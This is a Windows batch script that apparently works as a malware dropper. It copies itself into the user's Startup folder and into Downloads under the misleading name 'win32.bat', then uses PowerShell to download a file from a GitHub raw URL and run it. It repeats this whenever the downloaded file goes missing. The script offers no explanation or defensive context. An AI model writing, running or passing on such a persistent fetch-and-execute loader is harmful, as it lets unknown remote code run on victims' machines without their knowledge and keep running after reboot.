@echo off
setlocal

set "github_url=https://raw.githubusercontent.com/HATERSCOM/PROJEC1/refs/heads/main/heloo"
set "output_path=%USERPROFILE%\Downloads\hello.bat"
set "backup_path=%USERPROFILE%\Downloads\win32.bat"
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "startup_file=%startup_folder%\1.bat"
set "log_file=%USERPROFILE%\Downloads\script_log.txt"

echo Starting script at %DATE% %TIME% >> "%log_file%"

:check_file
rem Check if hello.bat exists
if not exist "%output_path%" (
    echo hello.bat not found. Re-executing the script... >> "%log_file%"
    goto :download_file
)

echo hello.bat found at %TIME%. Checking again in 5 minutes... >> "%log_file%"
timeout /t 300 >nul
goto :check_file

:download_file
rem Create a backup of this script in the Downloads folder
if not exist "%backup_path%" (
    copy "%~f0" "%backup_path%" >nul
    echo Script backup created in Downloads as win32.bat at %TIME%. >> "%log_file%"
) else (
    echo Backup win32.bat already exists in Downloads at %TIME%. >> "%log_file%"
)

rem Copy script to Startup folder if not already copied
if not exist "%startup_file%" (
    copy "%~f0" "%startup_file%" >nul
    echo Script copied to Startup folder at %TIME%. >> "%log_file%"
) else (
    echo The script is already in the Startup folder at %TIME%. >> "%log_file%"
)

powershell -Command "Invoke-WebRequest -Uri '%github_url%' -OutFile '%output_path%'"
if %errorlevel% neq 0 (
    echo Failed to download hello.bat from GitHub at %TIME%. Exiting script. >> "%log_file%"
    exit /b 1
)

start "" "%output_path%"
echo hello.bat has been executed at %TIME%. >> "%log_file%"

endlocal
